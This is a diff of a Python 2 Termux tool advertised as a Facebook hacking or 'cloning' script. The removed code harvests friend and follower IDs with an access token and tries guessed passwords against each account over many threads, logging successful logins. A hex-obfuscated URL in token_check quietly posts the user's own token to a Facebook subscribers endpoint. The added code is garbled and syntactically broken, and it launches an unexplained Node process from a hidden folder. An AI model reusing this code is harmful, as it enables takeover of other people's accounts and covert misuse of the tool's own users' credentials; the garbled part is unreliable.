@@ -1,836 +1,1314 @@
-#khosa #!/usr/bin/python2
-# -*- coding: utf-8
-
-#CODING BY : JUNAID BALOCH )
-#DON'T FORGET TO GIVE CREDIT TO BALOCH
-
-P = "\033[97;1m" 
-M = "\033[91;1m" 
-H = "\033[92;1m" 
-K = "\033[93;1m" 
-B = "\033[94;1m" 
-U = "\033[95;1m" 
-O = "\033[93;1m" 
-N = "\033[0m"
+#Kingkhosa coding=utf-8
+#/usr/bin/python2
+#Z4IN-LEGEND
 
 try:
-	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
-	from multiprocessing.pool import ThreadPool
-	from requests.exceptions import ConnectionError
+  imbort os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+
+ from multiprocessing.pool import Threadpool
 except ImportError:
-	os.system("pip2 install requests")
-	os.system("python2 MOHSIN.py")
+os.system('pip install requests')
+os.system('python2 you-name.py')
+os.system('clear')
+if not os.path.isfile('/date/date/com.termux/files/usr/bin/node')
+os.system('apt update && apt install npdejs-y')
+from requests.exceptions import ConnectionError
 
-from os import system
-from time import sleep
 
-def xox(z):
-    for e in z + "\n":
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.04)
-      
-agents = [
-					"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
-					"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
-					"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-					"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
-					"Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-					"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]",
-					"Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"
-				  ]
-				
-header = {"user-agent": '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
-					  "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-					  "x-fb-sim-hni": str(random.randint(20000, 40000)),
-					  "x-fb-net-hni": str(random.randint(20000, 40000)),
-					  "x-fb-connection-quality": "EXCELLENT",
-					  "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-					  "content-type": "application/x-www-form-urlencoded",
-					  "x-fb-http-engine": "Liger"
-					  }
-					
-user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])
+os.system ('git pull')
+if not os.path.isfile('/date/date/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js'):
+   os.system('fuser-k 5000/tcp &')
+  os.system('cd ..... && pip install progress')
+os.system('cd ..... && npm install')
+os.system("cd ..... && node index.js &")
+os.system('clear')
+time.sleep(10)
+elif os.path.isfile('/date/date/com.termux/files/home/mz-pro/...../node_modules/bytes/.js'):
+os.system('fuser -k 5000/tcp &')
+os.system('#')
+os.system('cd ..... && node index.js &')
+os.system(clear)
+bd=random.randint(2e7,3e7)
+sim=random.randint(2e4,4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys) 
+sys.setdefaultencoding('utf-8')
+c ='\033[1;92m'
+c2 ='\033[0;97m'
+c3 ='\033[1;91m'
+logo=''''''╔╗───╔═══╗╔═══╗╔═══╗╔═╗─╔╗╔═══╗
+             ║║───║╔══╝║╔═╗║║╔══╝║║╚╗║║╚╗╔╗║
+             ║║───║╚══╗║║─╚╝║╚══╗║╔╗╚╝║─║║║║
+             ║║─╔╗║╔══╝║║╔═╗║╔══╝║║╚╗║║─║║║║
+             ║╚═╝║║╚══╗║╚╩═║║╚══╗║║─║║║╔╝╚╝║
+             ╚═══╝╚═══╝╚═══╝╚═══╝╚╝─╚═╝╚═══╝
 
-try:
-	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
-	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
-except requests.exceptions.ConnectionError:
-	os.system("clear")
-	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
-	sys.exit()
-	
-ip = requests.get('https://api.ipify.org').text.strip()
-loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
-def linex():
-	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
-def logo():
-	os.system('echo "\n\n        __  __    _    _   _    _    ____ ___\n   | |  ____| \n     | | |  \n    | |  __|  \n   | |__| |  \____/|_|  " | lolcat -a -d 2 -s 50')	
 
+===============================================
+/033[1;93m powoer BY Z4IN
+/033[1;93m facebook = B4LOCH112
+/033[1;91m ------------------------------------
+ HACK FACEBOOK 
+/033[1;91m-------------------------------------
+''''''
 def main():
-	os.system("clear")
-	logo()
-	print("\t\033[93;1m======================================\x1b[0m")
-	print("")
-	print("\033[92;1m  [1] START CRACK")
-	print("\033[93;1m  [2] DUMP/EXTRACT USER-IDZ")
-	print("\033[94;1m  [3] HOW TO GET ACCESS TOKEN")
-	print("\033[96;1m  [4] CONTACT ME ON WHATSAPP")
-	print("\033[92;1m  [5] UPDATE TOOL")
-	print("\033[91;1m  [0] EXIT")
-	print("")
-	log_sel()
-	
-def log_sel():
-	sel = raw_input("\033[93;1m  CHOOSE: ")
-	if sel == "":
-		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
-		log_sel()
-	elif sel =="1" or sel =="01":
-		token()
-	elif sel =="2" or sel =="02":
-		ex_id()
-	elif sel =="3" or sel =="03":
-		subprocess.check_output(["am", "start", "https://www.facebook.com/112406476962548/posts/348595290010331/?app=fbl"])
-		main()
-	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
-		os.system('xdg-open https://wa.me/+994400385410')
-		main()
-	elif sel =="5" or sel =="05":
-		import os
-		try:
-			os.system("git clone https://github.com/MohSinTheLegend/MOHSIN-TOOL")
-			os.system("rm -rf MOHSIN.py")
-			os.system("cp -f MOHSIN-TOOL/MOHSIN.py \\.")
-			os.system("rm -rf MOHSIN-TOOL")
-			print "\033[92;1m\n TOOL UPDATE SUCCESSFULLy...>_<\n"
-			time.sleep(2)
-			main()
-		except KeyboardInterrupt:
-			print "\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n"
-	        	main()
-	elif sel =="0" or sel =="00":
-		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN SYCO :)")
-		sys.exit()
-	else:
-		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
-		print("")
-		log_sel()
+  os system.('clear')
 
-def token():
+print logo
+  print('''')
+  print('/033[ LETS START ]').center(50)
+  print('')
+  print("\033[1;96m[1]\033[1;97mSTART CLONiNG....")
+  print("")
+    print("\033[1;95m[2]\033[1;97mFOLLOW Z4IN B4LOCH ")
+  print("")
+  print("\033[1;91m[0]\033[1;97mEXIT Z4IN B4LOCH ")
+      print("")
+    main_select()
+def main_select():
+    Mz = raw_input("\033[1;97m[#] Choose Opition --->\033[1;96m ")
+if Mz  =="1":
+        login()
+    if Mz =="2":
+        os.system("https://www.facebook.com/B4LOCH112")
+	main()   
+        os.system("exit")
+else
+  print("[!] Please select a valid option").center(50)
+        time.sleep(2)
+
+        main()
+  def login():
     os.system("clear")
-    try:
-        token = open("vau_token.txt", "r").read()
-        menu()
-    except(KeyError , IOError):
-        logo()
+
+ 
+
+    print logo
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[0;92m[ Login Menu ]").center(50)
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;97m[1]\033[1;96mLogin Using Token")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;97m[2]\033[1;96mHOW TO GET FREE TOKEN.")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;97m[3]\033[1;91mBack")
+
+ 
+
+    print("")
+
+ 
+
+    login_select()
+
+ 
+
+def login_select():
+
+ 
+
+    Mz = raw_input(" \033[1;97m Choose Option :\033[1;96m ")
+
+ 
+
+    if Mz =="1":
+
+ 
+
+        os.system("clear")
+
+ 
+
+        print logo
+
+ 
+
         print("")
-        print("\t\033[92;1m  LOGIN TOKEN")
-        print("")
-        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
-        sav = open("vau_token.txt", "w")
-        sav.write(token)
-        sav.close()
-        token_check()
-        menu()        
-        
-def token_check():
-	try:
-		token=open('vau_token.txt','r').read()
-	except IOError:
-		print"\033[91;1m[!] TOKEN INVALID"
-		os.system('rm -rf vau_token.txt')
-	requests.post(useragent_url + token, headers=header)
-	pass
+
+ 
+
+	print("[ login with token ]").center(50)
+
+ 
+
+	print("")
+
+ 
+
+        token = raw_input("[!] Token ? \033[0;90m")
+
+ 
+
+        token_s = open(".fb_token.txt","w")
+
+ 
+
+        token_s.write(token)
+
+ 
+
+        token_s.close()
+
+ 
+
+        try:
+
+ 
+
+            r = requests.get("https://graph.facebook.com/me?access_token="+token)
+
+ 
+
+            q = json.loads(r.text)
+
+ 
+
+            name = q["name"]
+
+ 
+
+            nm = name.rsplit(" ")[0]
+
+ 
+
+            print("")
+
+ 
+
+            print("\033[1;92mYour token login successfully").center(50)
+
+ 
+
+            time.sleep(1)
+
+ 
+
+	    os.system("https://www.facebook.com/B4LOCH112")
+
 	
+
+ 
+
+	    time.sleep(1)
+
+ 
+
+            menu()
+
+ 
+
+        except (KeyError , IOError):
+
+ 
+
+            print("")
+
+ 
+
+            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)
+
+ 
+
+            print("")
+
+ 
+
+            time.sleep(2)
+
+ 
+
+            login()
+
+ 
+
+    elif Mz =="2":
+
+ 
+
+        os.system("https://www.facebook.com/B4LOCH112")
+
+ 
+
+    elif Mz =="3":
+
+ 
+
+        main()
+
+ 
+
+    else:
+
+ 
+
+        print("")
+
+ 
+
+        print("Select a valid option").center(50)
+
+ 
+
+        print("")
+
+ 
+
+        login_select()
+
+ 
+
+ 
+
+ 
+
+ 
+
 def menu():
-    os.system("clear")
-    try:
-        token = open("vau_token.txt", "r").read()
-    except(KeyError , IOError):
-        token()
-    try:
-        r = requests.get("https://graph.facebook.com/me?access_token="+token)
-        q = json.loads(r.text)
-        name = q["name"]
-    except(KeyError):
-        logo()
-        print("")
-        print("\t\033[91;1m  LOGGED IN TOKEN HAS EXPIRED")
-        os.system("rm -rf vau_token.txt")
-        print("")
-        time.sleep(1)
-        token()
-    os.system("clear")
-    xn = name.upper()
-    logo()
-    print("")
-    print("\033[93;1m     HELLO   : \033[92;1m"+xn)
-    print("\033[93;1m     REGION  : \033[92;1m") + loc
-    print("\033[93;1m     YOUR IP : \033[92;1m") + ip
-    print("")
 
-    print("")
-    print("\033[92;1m  [1] CRACK WITH AUTO PASS")
-    print("\033[93;1m  [2] CRACK WITH MANUAL/CHOOSE PASS")
-    print('\033[91;1m  [0] BACK')
-    print("")
-    menu_option()
-def menu_option():
-	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
-	if select =="1":
-		crack1()
-	elif select =="2":
-		crack()
-	elif select =="3":
-		ex_id()
-	elif select =="0":
-		main()
-	else:
-		print("")
-		print("\t\033[91;1m     SELECT VALID OPTION")
-		print("")
-		menu_option()
-		
-#####
+ 
 
-def crack1():
-	global token
-	os.system("clear")
-	try:
-		token = open("vau_token.txt","r").read()
-	except IOError:
-		print("")
-		print("\t\033[91;1m     TOKEN NOT FOUND ")
-		time.sleep(1)
-		token()
-	os.system("clear")
-	logo()
-	print("")
-	print("\t\033[93;1m CRACK WITH AUTO PASS")
-	print("")
-	print("\033[94;1m  [1] CRACK PUBLIC ID")
-	print("\033[93;1m  [2] CRACK FOLLOWERS")
-	print("\033[92;1m  [3] CRACK FILE")
-	print("")
-	crack_select1()
-	
-def crack_select1():
-	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
-	id=[]
-	oks=[]
-	cps=[]
-	if select =="1":
-		os.system("clear")
-		logo()
-		print("")
-		idt = raw_input("\033[92;1m  INPUT PUBLIC ID : ")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  AUTO PASS CRACKING")
-			print('')
-			print("\033[92;1m  CLONING FROM : "+q["name"])
-		except KeyError:
-			print("\t\033[91;1m  INVALID LINK OR TOKEN")
-			print("")
-			raw_input("\033[91;1m  PRESS ENTER TO BACK")
-			crack1()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="2":
-		os.system("clear")
-		logo()
-		print("")
-		idt = raw_input("\033[92;1m  INPUT FOLLOWER ID : ")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  AUTO PASS CRACKING")
-			print('')
-			print("\033[92;1m  CLONING FROM : "+q["name"])
-		except KeyError:
-			print("\t\033[91;1m     INVALID LINK OR TOKEN")
-			print("")
-			raw_input("\033[91;1m PRESS ENTER TO BACK")
-			crack1()
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="3":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m   AUTO PASS CRACKING")
-		print("")
-		filelist = raw_input('\033[92;1m  INPUT FILE: ')
-		try:
-			for line in open(filelist, 'r').readlines():
-				id.append(line.strip())
-				
-		except IOError:
-			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
-			print("")
-			raw_input("\033[93;1m PRESS ENTER TO BACK")
-			crack1()
-			
-	elif select =="0":
-	    menu()
-	else:
-		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
-		print("")
-		crack_select1()
-	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
-	print("\033[93;1m  THE PROCESS HAS BEEN STARTED")
-	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
-	print("")
-	linex()
-	print("")
-	def main(arg):
-		user=arg
-		uid,name=user.split("|")
-		vaugent = random.choice(agents)
-		session = requests.Session()
-		session.headers.update({'User-Agent': vaugent})
-		try:
-			pass1 = name.lower().split(' ')[0] + '12'
-			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-			q = json.loads(data)
-			if "access_token" in q and "EAAA" in q:
-				print(" \033[1;32m [JF-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("ok.txt", "a")
-				ok.write(uid+"|"+pass1+"\n")
-				ok.close()
-				oks.append(uid+pass1)
-			else:
-				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [JF-CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("cp.txt", "a")
-					cp.write(uid+"|"+pass1+"\n")
-					cp.close()
-					cps.append(uid+pass1)
-				else:
-					pass2 = name.lower().split(' ')[0] + '110'
-					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-					q = json.loads(data)
-					if "access_token" in q and "EAAA" in q:
-						print(" \033[1;32m [JF-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("ok.txt", "a")
-						ok.write(uid+"|"+pass2+"\n")
-						ok.close()
-						oks.append(uid+pass2)
-					else:
-						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [JF-CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("cp.txt", "a")
-							cp.write(uid+"|"+pass2+"\n")
-							cp.close()
-							cps.append(uid+pass2)
-						else:
-							pass3 = name.lower().split(' ')[0] + '007'
-							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-							q = json.loads(data)
-							if "access_token" in q and "EAAA" in q:
-								print(" \033[1;32m [JF-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("ok.txt", "a")
-								ok.write(uid+"|"+pass3+"\n")
-								ok.close()
-								oks.append(uid+pass3)
-							else:
-								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [JF-CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("cp.txt", "a")
-									cp.write(uid+"|"+pass3+"\n")
-									cp.close()
-									cps.append(uid+pass3)
-								else:
-									pass4 = name.lower().split(' ')[0] + '@12345'
-									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-									q = json.loads(data)
-									if "access_token" in q and "EAAA" in q:
-										print(" \033[1;32m [JF-OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("ok.txt", "a")
-										ok.write(uid+"|"+pass4+"\n")
-										ok.close()
-										oks.append(uid+pass4)
-									else:
-										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [JF-CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("cp.txt", "a")
-											cp.write(uid+"|"+pass4+"\n")
-											cp.close()
-											cps.append(uid+pass4)
-										else:
-											pass5 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
-											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-											q = json.loads(data)
-											if "access_token" in q and "EAAA" in q:
-												print(" \033[1;32m [JF-OK] "+uid+" | "+pass5+"\033[0;97m")
-												ok = open("ok.txt", "a")
-												ok.write(uid+"|"+pass5+"\n")
-												ok.close()
-												oks.append(uid+pass5)
-											else:
-												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [JF-CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("cp.txt", "a")
-													cp.write(uid+"|"+pass5+"\n")
-													cp.close()
-													cps.append(uid+pass5)
-												else:
-													pass6 = name.lower()
-													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-													q = json.loads(data)
-													if "access_token" in q and "EAAA" in q:
-														print(" \033[1;32m [JF-OK] "+uid+" | "+pass6+"\033[0;97m")
-														ok = open("ok.txt", "a")
-														ok.write(uid+"|"+pass6+"\n")
-														ok.close()
-														oks.append(uid+pass6)
-													else:
-														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;33m [JF-CP] "+uid+" | "+pass6+"\033[0;97m")
-															cp = open("cp.txt", "a")
-															cp.write(uid+"|"+pass6+"\n")
-															cp.close()
-															cps.append(uid+pass6)
-														else:
-															pass7 = "786110"
-															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-															q = json.loads(data)
-															if "access_token" in q and "EAAA" in q:
-																print(" \033[1;32m [JF-OK] "+uid+" | "+pass7+"\033[0;97m")
-																ok = open("ok.txt", "a")
-																ok.write(uid+"|"+pass7+"\n")
-																ok.close()
-																oks.append(uid+pass7)
-															else:
-																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;33m [JF-CP] "+uid+" | "+pass7+"\033[0;97m")
-																	cp = open("cp.txt", "a")
-																	cp.write(uid+"|"+pass7+"\n")
-																	cp.close()
-																	cps.append(uid+pass7)
-																else:
-																	pass8 = name.lower().split(' ')[1] + '007'
-																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-																	q = json.loads(data)
-																	if "access_token" in q and "EAAA" in q:
-																		print(" \033[1;32m [JF-OK] "+uid+" | "+pass8+"\033[0;97m")
-																		ok = open("ok.txt", "a")
-																		ok.write(uid+"|"+pass8+"\n")
-																		ok.close()
-																		oks.append(uid+pass8)
-																	else:
-																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;33m [JF-CP] "+uid+" | "+pass8+"\033[0;97m")
-																			cp = open("cp.txt", "a")
-																			cp.write(uid+"|"+pass8+"\n")
-																			cp.close()
-																			cps.append(uid+pass8)
-												
-										
-										
-		except:
-			pass
-	p = ThreadPool(30)
-	p.map(main, id)
-	print("")
-	linex()
-	print("")
-	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")
-	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
-	print("")
-	linex()
-	print("")
-	raw_input("\033[93;1m PRESS ENTER TO BACK ")
-	menu()
-	
-######
-
-def crack():
-	global token
-	os.system("clear")
-	try:
-		token = open("vau_token.txt","r").read()
-	except IOError:
-		print("")
-		print("\t\033[91;1m  TOKEN NOT FOUND ")
-		time.sleep(1)
-		token()
-	os.system("clear")
-	logo()
-	print("")
-	print("\t\033[93;1m  MANUAL PASS CRACKING")
-	print("")
-	print("\033[94;1m  [1] CRACK PUBLIC ID")
-	print("\033[93;1m  [2] CRACK FOLLOWERS")
-	print("\033[92;1m  [3] CRACK FILE")
-	print("")
-	crack_select()
-
-def crack_select():
-	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
-	id=[]
-	oks=[]
-	cps=[]
-	if select =="1":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m  MANUAL PASS CRACKING")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 123, 1122, 321, 1234, 786 ETC")
-		print("")
-		idt = raw_input("\n\033[92;1m  INPUT PUBLIC ID : ")
-		print("")
-		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: ")
-		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: ")
-		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: ")
-		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: ")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 223344, 556677, 786786 ETC ")
-		print("")
-		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
-		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
-		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  MANUAL PASS CRACKING")
-			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
-		except KeyError:
-			print("\t\033[91;1m  INVALID LINK OR TOKEN")
-			print("")
-			raw_input(" PRESS ENTER TO BACK")
-			crack()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
